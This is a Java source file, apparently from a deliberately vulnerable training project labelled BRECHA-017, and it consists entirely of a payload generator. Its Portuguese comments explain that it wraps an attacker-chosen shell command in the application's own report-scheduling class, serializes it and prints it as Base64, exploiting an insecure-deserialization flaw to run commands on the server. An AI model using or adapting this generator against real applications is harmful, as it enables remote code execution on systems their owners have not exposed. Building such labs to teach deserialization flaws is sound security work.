import br.com.brecha.dominio.AgendamentoDeRelatorio;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.List;

/**
 * Monta o agendamento serializado do BRECHA-017 com o comando que o atacante
 * quer rodar no servidor. Usa a própria classe da aplicação, que o atacante
 * obtém do jar. Uso, depois do mvn package:
 *
 * <pre>java -cp target/classes infra/rede/GerarPayload.java bash -c "comando"</pre>
 */
public class GerarPayload {

    public static void main(String[] comando) throws Exception {
        var bytes = new ByteArrayOutputStream();
        try (var saida = new ObjectOutputStream(bytes)) {
            saida.writeObject(new AgendamentoDeRelatorio("PDF", "08:00", List.of(comando)));
        }
        System.out.println(Base64.getEncoder().encodeToString(bytes.toByteArray()));
    }
}
